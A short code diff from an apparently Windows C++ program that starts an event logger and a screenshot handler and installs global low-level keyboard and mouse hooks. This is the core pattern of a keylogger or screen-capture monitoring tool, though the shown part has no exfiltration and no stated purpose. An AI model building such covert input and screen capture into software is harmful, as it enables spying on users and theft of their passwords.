@@ -9,8 +9,7 @@
 
 int main() {
     EventLogger::getInstance().start();
-
-    //TakeScreenshot(nullptr);
+    ScreenshotHandler::getInstance().start();
 
     const HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, reinterpret_cast<HOOKPROC>(&KeyboardCallback), nullptr, 0);
     const HHOOK mouse = SetWindowsHookEx(WH_MOUSE_LL, reinterpret_cast<HOOKPROC>(&MouseCallback), nullptr, 0);
